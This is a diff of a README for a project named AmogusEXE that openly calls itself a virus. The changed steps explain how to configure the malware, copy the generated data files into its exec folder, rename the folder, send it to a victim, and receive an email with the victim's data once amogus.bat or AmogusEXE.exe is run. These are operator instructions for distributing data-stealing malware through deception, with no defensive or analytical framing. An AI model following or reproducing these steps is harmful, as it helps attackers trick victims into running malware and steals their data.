@@ -31,8 +31,8 @@ Follow these steps to configure this virus.
 3. Download latest release in releases.
 4. Open Configurator folder and launch AEXEC.exe (Stands for AmogusEXEConfigurator), and enter requested data:
 It should look like this: [image](/AmogusEXE/img/console.png)
-5. After everything is configured, you will see `data.enc` file created at current directory. Copy this file to Virus directory.
-6. Then, you can send Virus folder (Obviously renamed) to victim. When victim launches the virus, you will receive email.
+5. After everything is configured, you will see `data.enc` and `data` files created at current directory. Go to Virus directory, then to exec directory. Copy files there.
+6. Then, you can send Virus folder (Obviously renamed) to victim. When victim launches the amogus.bat or AmogusEXE.exe, you will receive email with data.
 
 ## ADVANCED
 
